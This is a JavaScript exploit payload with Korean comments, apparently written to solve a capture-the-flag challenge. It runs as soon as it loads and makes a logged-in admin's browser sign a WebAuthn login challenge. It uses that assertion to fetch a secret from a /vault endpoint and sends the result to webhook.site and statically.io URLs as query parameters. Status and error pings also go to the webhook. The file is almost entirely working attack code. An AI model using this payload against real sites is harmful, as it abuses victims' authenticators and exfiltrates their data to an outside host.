//test code
fetch('https://webhook.site/a79beb40-b5f6-4da3-a297-992b4f0cbc17?status=started');


// 1. Base64 URL 인코딩/디코딩 헬퍼 함수 (index.js 참조)
function b64url(buf) {
  return btoa(String.fromCharCode(...new Uint8Array(buf)))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/, '');
}

function b64decode(s) {
  return Uint8Array.from(atob(s.replace(/-/g, '+').replace(/_/g, '/')), c => c.charCodeAt(0));
}

// 메인 공격 함수
async function pwn() {
  try {
    // 2. /api/login/begin을 호출하여 인증 챌린지 획득
    const beginRes = await fetch('/api/login/begin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({})
    });
    
    if (!beginRes.ok) return; // 실패 시 종료
    
    const opts = await beginRes.json();
    
    // WebAuthn 처리를 위해 데이터를 ArrayBuffer로 디코딩
    opts.challenge = b64decode(opts.challenge);
    if (opts.allowCredentials) {
      opts.allowCredentials.forEach(c => c.id = b64decode(c.id));
    }

    // 3. 브라우저에 인증 요청 (Admin의 권한으로 서명 생성됨)
    const cred = await navigator.credentials.get({ publicKey: opts });

    // 4. /vault 에 보낼 credential 객체 포맷팅
    const credentialBody = {
      id: cred.id,
      rawId: b64url(cred.rawId),
      type: cred.type,
      response: {
        authenticatorData: b64url(cred.response.authenticatorData),
        clientDataJSON: b64url(cred.response.clientDataJSON),
        signature: b64url(cred.response.signature),
        userHandle: cred.response.userHandle ? b64url(cred.response.userHandle) : null
      },
      authenticatorAttachment: cred.authenticatorAttachment
    };

    const vaultToken = ""; 

    // 5. 생성된 서명으로 /vault 에 POST 요청하여 플래그 탈취
    const vaultRes = await fetch('/vault', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        vault_token: vaultToken,
        credential: credentialBody
      })
    });

    const flagData = await vaultRes.text();

    // 6. 탈취한 플래그를 공격자 서버로 전송 (URL 파라미터 활용)
    await fetch('https://cdn.statically.io/gh/mod-siw/PhantomPass@main/code.js/?flag=' + encodeURIComponent(flagData));

  } catch (e) {
    // 디버깅용 에러 전송 
    await fetch('https://webhook.site/a79beb40-b5f6-4da3-a297-992b4f0cbc17/?error=' + encodeURIComponent(e.message));
  }
}

// 스크립트가 로드되자마자 즉시 실행
pwn();
